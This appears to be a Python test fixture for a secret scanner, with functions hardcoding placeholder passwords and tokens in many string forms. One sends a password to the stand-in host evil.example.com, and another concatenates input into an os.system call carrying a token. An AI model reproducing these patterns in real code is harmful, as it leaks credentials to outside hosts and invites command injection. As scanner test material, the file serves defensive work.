import os

import psycopg2
import requests
from requests.auth import HTTPBasicAuth


def concat(h):
    return psycopg2.connect(host=h, password="a" + "LEAKCONCATFAKE")


def getenv_default(h):
    return psycopg2.connect(host=h, password=os.getenv("PGPW", "LEAKGETENVFAKE"))


def implicit_concat(h):
    return psycopg2.connect(host=h, password="a" "LEAKIMPLICITFAKE")


def bytes_prefix(h):
    return psycopg2.connect(host=h, password=b"x LEAKBYTESFAKE")


def raw_prefix(h):
    return psycopg2.connect(host=h, password=r"x LEAKRAWFAKE")


def f_prefix(h):
    return psycopg2.connect(host=h, password=f"x LEAKFSTRINGFAKE")


def triple_quoted(h):
    return psycopg2.connect(host=h, password="""correct LEAKTRIPLEFAKE""")


def basic_auth(kw):
    return requests.get(**kw, auth=HTTPBasicAuth("admin", "LEAKBASICAUTHFAKE"))


def bare_then_host(pw):
    return psycopg2.connect(password=pw,host="evil.example.com")


def curl_token(u):
    return os.system(u + " -H 'Authorization: token LEAKCURLTOKENFAKE'")
